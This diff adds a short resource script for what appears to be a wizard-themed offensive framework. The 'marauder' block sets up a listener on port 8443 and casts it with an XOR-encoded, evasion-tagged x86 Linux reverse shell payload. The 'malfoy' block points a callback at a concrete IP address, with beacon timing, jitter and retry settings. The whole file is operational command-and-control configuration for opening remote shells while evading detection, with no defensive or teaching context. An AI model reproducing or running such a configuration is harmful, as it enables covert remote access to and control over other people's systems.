@@ -1,0 +1,21 @@
+wield marauder
+enchant LPORT 8443
+enchant TIMEOUT 25
+enchant SPELL x86linux/evasion/reverse_shell
+enchant RITUAL tcp
+enchant FIDELIUS basic/xor
+cast
+wield malfoy
+enchant LHOST 159.223.110.159
+enchant TIMEOUT 90
+enchant BEACON_TIME 25
+enchant RETRY_ATTEMPTS_CAP 20
+enchant SLEEP 10
+enchant RETRY_DELAY 5
+enchant JITTER 48
+enchant SPELL x86linux/evasion/reverse_shell
+enchant RETRY_METHOD exponential_jitter
+enchant PROTOCOL_NAME tcp
+enchant PROTOCOL_ENCODER_NAME basic/xor
+enchant PAYLOAD_ENCODER_NAME basic/null
+
